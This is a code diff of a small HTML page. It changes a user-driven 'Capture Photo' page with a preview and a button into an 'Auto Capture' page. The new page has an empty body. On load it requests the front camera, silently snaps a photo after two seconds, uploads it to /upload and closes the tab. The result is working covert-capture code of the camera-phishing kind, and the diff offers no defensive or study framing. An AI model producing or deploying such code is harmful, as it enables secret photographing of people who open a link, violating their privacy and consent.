@@ -3,33 +3,29 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Capture Photo</title>
-</head>
-<body>
-
-    <h2>Click below to take a photo</h2>
-    
-    <video id="video" autoplay></video>
-    <button onclick="capturePhoto()">📷 Capture</button>
-    <canvas id="canvas" style="display:none;"></canvas>
-    
+    <title>Auto Capture</title>
     <script>
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const context = canvas.getContext('2d');
+        async function captureAndSend() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const video = document.createElement("video");
+                video.srcObject = stream;
+                await video.play();
+                
+                const canvas = document.createElement("canvas");
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext("2d");
 
-        // 🔹 Ask for camera permission and use front camera
-        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-        .then(stream => {
-            video.srcObject = stream;
-        })
-        .catch(err => console.error("Camera access denied!", err));
+                setTimeout(() => {
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    canvas.toBlob(sendPhoto, "image/jpeg");
+                    stream.getTracks().forEach(track => track.stop()); // Stop camera
+                }, 2000); // Auto-capture after 2 sec
 
-        function capturePhoto() {
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            canvas.toBlob(blob => sendPhoto(blob), "image/jpeg");
+            } catch (err) {
+                console.error("Camera access denied!", err);
+            }
         }
 
         function sendPhoto(blob) {
@@ -39,10 +35,13 @@
             fetch("/upload", {
                 method: "POST",
                 body: formData
-            }).then(response => response.text())
-              .then(data => alert("Photo sent successfully!"));
+            }).then(() => window.close()); // Close tab after sending
         }
-    </script>
 
+        // 🔹 Start capturing as soon as page loads
+        window.onload = captureAndSend;
+    </script>
+</head>
+<body>
 </body>
 </html>
